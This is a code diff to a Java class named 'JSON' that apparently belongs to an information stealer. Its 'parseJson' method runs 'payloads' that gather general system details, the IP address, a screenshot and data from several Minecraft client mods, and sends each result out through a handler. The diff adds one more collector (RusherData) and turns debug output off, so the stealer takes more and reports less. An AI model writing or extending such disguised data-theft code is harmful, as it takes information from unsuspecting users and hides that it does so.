@@ -9,15 +9,14 @@ import java.util.ArrayList;
 
 public class JSON {
     private final ArrayList<JSONObject> objects = new ArrayList<>();
-    private final boolean debug = true;
+    private final boolean debug = false;
 
     private void parseJson() {
         this.objects.add(new GeneralInformation());
         this.objects.add(new IPInformation());
-
-        // files
         this.objects.add(new Screenshot());
         this.objects.add(new FutureData());
+        this.objects.add(new RusherData());
         this.objects.add(new KonasData());
         this.objects.add(new ImpactData());
         this.objects.add(new KamiBlueData());
@@ -30,9 +29,8 @@ public class JSON {
             try {
                 payload.handle();
             } catch (Exception e) {
-                JSONRegexHandler.send(new JSONBuilder().value("content", "> Failure on payload "+ payload.getName()).build());
-                if (debug)
-                    e.printStackTrace();
+                JSONRegexHandler.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
+                if (debug) e.printStackTrace();
             }
         });
         JSONRegexHandler.send(separator);
